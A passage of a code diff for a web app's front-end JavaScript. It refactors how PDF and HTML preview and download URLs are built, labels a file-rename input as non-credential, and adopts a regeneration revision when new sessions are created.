-    const snapQuery=_mediaSnapQuery(el);
-    const publicMediaUrl='api/media?path='+encodeURIComponent(path);
-    const mediaUrl=publicMediaUrl+(mediaSessionId?'&session_id='+encodeURIComponent(mediaSessionId):'')+snapQuery;
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const mediaUrl=_mediaPreviewUrl(path,{snap:snap||undefined});
+    // Freeze action URLs alongside the fetch: callbacks may run in another session.
+    const dlUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
     const loadPdf=(pdfjsLib)=>{
       fetch(mediaUrl)
         .then(r=>{if(!r.ok) throw new Error(r.status); return r.arrayBuffer();})
         .then(buf=>{
           if(buf.byteLength>PDF_MAX_SIZE){
-            const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
             el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_too_large')}</span></div>`;
             return;
           }
@@ -19831,7 +21820,6 @@ function loadPdfInline(container){
         })
         .then(pdf=>{
           if(!pdf) return;
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           const total=pdf.numPages;
           const pagesLabel=total>1?` · ${total} pages`:'';
           const wrap=document.createElement('div');
@@ -19870,7 +21858,6 @@ function loadPdfInline(container){
           renderPage(1);
         })
         .catch(()=>{
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_error')}</span></div>`;
         });
     };
@@ -19890,7 +21877,6 @@ function loadPdfInline(container){
       window.addEventListener('pdfjs-ready',()=>{ _pdfjsReady=true; loadPdf(window._pdfjsLib); },{once:true});
       setTimeout(()=>{
         if(!_pdfjsReady){
-          const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
           if(el.parentNode){
             el.outerHTML=`<div class="pdf-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('pdf_error')}</span></div>`;
           }
@@ -19910,24 +21896,21 @@ function loadHtmlInline(container){
     el.setAttribute('data-loaded','1');
     const path=el.dataset.path;
     const fname=path.split('/').pop()||path;
-    const mediaSessionId=(typeof S!=='undefined'&&S&&S.session&&S.session.session_id)?String(S.session.session_id):'';
-    const snapQuery=_mediaSnapQuery(el);
-    const publicMediaUrl='api/media?path='+encodeURIComponent(path);
-    const mediaUrl=publicMediaUrl+(mediaSessionId?'&session_id='+encodeURIComponent(mediaSessionId):'')+snapQuery;
+    const snap=_mediaSnapQuery(el).replace(/^&snap=/,'');
+    const mediaUrl=_mediaPreviewUrl(path,{snap:snap||undefined});
+    const openUrl=_mediaPreviewUrl(path,{inline:true,snap:snap||undefined});
+    const dlUrl=_mediaPreviewUrl(path,{download:true,snap:snap||undefined});
     fetch(mediaUrl, {cache:'no-store'})
       .then(r=>{if(!r.ok) throw new Error(r.status); return r.text();})
       .then(html=>{
         if(html.length>HTML_MAX_SIZE){
-          const openUrl=publicMediaUrl+'&inline=1'+snapQuery;
           el.outerHTML=`<div class="html-preview-fallback"><a class="msg-media-link" href="${openUrl}" target="_blank" rel="noopener">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('html_too_large')}</span></div>`;
           return;
         }
-        const openUrl=publicMediaUrl+'&inline=1'+snapQuery;
         const safeHtml=html.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
         el.outerHTML=`<div class="html-preview-wrap"><div class="html-preview-header"><span>${t('html_sandbox_label')}</span><a href="${openUrl}" target="_blank" rel="noopener" class="html-open-link">${t('html_open_full')} ↗</a></div><iframe srcdoc="${safeHtml}" sandbox="allow-scripts" class="html-preview-iframe" loading="lazy"></iframe></div>`;
       })
       .catch(()=>{
-        const dlUrl=publicMediaUrl+'&download=1'+snapQuery;
         el.outerHTML=`<div class="html-preview-fallback"><a class="msg-media-link" href="${dlUrl}" download="${esc(fname)}">📎 ${esc(fname)}</a><br><span style="color:var(--muted);font-size:12px">${t('html_error')}</span></div>`;
       });
   });
@@ -21053,6 +23036,8 @@ function _renderTreeItems(container, entries, depth){
       }
       const inp=document.createElement('input');
       inp.className='file-rename-input';inp.value=item.name;
+      // #7542: workspace file rename, not a credentials field.
+      _markNonCredentialInput(inp);
       inp.onclick=(e2)=>e2.stopPropagation();
       const finish=async(save)=>{
         inp.onblur=null;
@@ -21408,7 +23393,7 @@ async function promptNewFile(targetDir = S.currentDir || '.'){
       // System-minted session (#6022): explicit worktree:false — creating a
       // file from a blank page must not inherit the config worktree default.
       const r=await api('/api/session/new',{method:'POST',body:JSON.stringify({workspace:ws,worktree:false})});
-      if(r&&r.session){S._pendingSessionToolsets=null;S.session=r.session;S.messages=[];syncTopbar();renderMessages();await renderSessionList();}
+      if(r&&r.session){S._pendingSessionToolsets=null;S.session=r.session;if(typeof _adoptRegenerationRevision==='function') _adoptRegenerationRevision(r.session);S.messages=[];syncTopbar();renderMessages();await renderSessionList();}
     }catch(e){setStatus(t('create_failed')+e.message);return;}
   }
   if(!S.session)return;
@@ -21441,7 +23426,7 @@ async function promptNewFolder(targetDir = S.currentDir || '.'){
       // System-minted session (#6022): explicit worktree:false — creating a
       // folder from a blank page must not inherit the config worktree default.
       const r=await api('/api/session/new',{method:'POST',body:JSON.stringify({workspace:ws,worktree:false})});
-      if(r&&r.session){S._pendingSessionToolsets=null;S.session=r.session;S.messages=[];syncTopbar();renderMessages();await renderSessionList();}
+      if(r&&r.session){S._pendingSessionToolsets=null;S.session=r.session;if(typeof _adoptRegenerationRevision==='function') _adoptRegenerationRevision(r.session);S.messages=[];syncTopbar();renderMessages();await renderSessionList();}
     }catch(e){setStatus(t('folder_create_failed')+e.message);return;}
   }
   if(!S.session)return;
